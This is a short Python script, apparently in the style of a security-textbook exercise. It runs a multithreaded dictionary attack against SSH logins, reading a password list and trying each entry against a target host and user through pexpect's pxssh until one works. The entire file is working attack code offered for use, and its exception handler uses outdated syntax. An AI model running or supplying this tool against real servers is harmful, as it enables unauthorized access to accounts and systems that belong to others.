from pexpect import pxssh
import optparse
from threading import *
import time

maxConn=5
conn_lock=BoundedSemaphore(value=maxConn)
Found=False
Fails=0

def connect(host,user,passwd,release):
    global Found
    global Fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,passwd)
        print("[+] Password Found:"+passwd)
        Found=True
        #s.interact()
    except(Exception,e):
        if'read_nonblocking' in str(e):
            Fails=Fails+1
            time.sleep(5)
            connect(host, user, passwd,False)
        elif 'synchronized with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, passwd,False)
    finally:
        if release:
            conn_lock.release()

def main():
    parser=optparse.OptionParser('usage%prog -H <target host> -u <user> -F <dictionary for password>')
    parser.add_option('-H',dest='host',type='string',help='target host')
    parser.add_option('-u',dest='user',type='string',help='username')
    parser.add_option('-F',dest='passwdList',type='string',help='passwd list')
    (options, args) = parser.parse_args()
    host = options.host
    user = options.user
    passwdFile=options.passwdList
    if(host==None)|(user==None)|(passwdFile==None):
        print(parser.usage)
        exit(0)
    pf=open(passwdFile,'r')
    for passwd in pf.readlines():
        if Found:
            print('[*] Exiting:Password Found')
            exit(0)
        elif(Fails > 5):
            print('[!] Exiting:Too Many Sockets Timeouts')
            exit(0)
        passwd=passwd.strip('\r').strip('\n')
        conn_lock.acquire()
        print('[-] Testing: '+str(passwd))
        t=Thread(target=connect,args=(host,user,passwd,True))
        t.start()



if __name__ == '__main__':
    main()
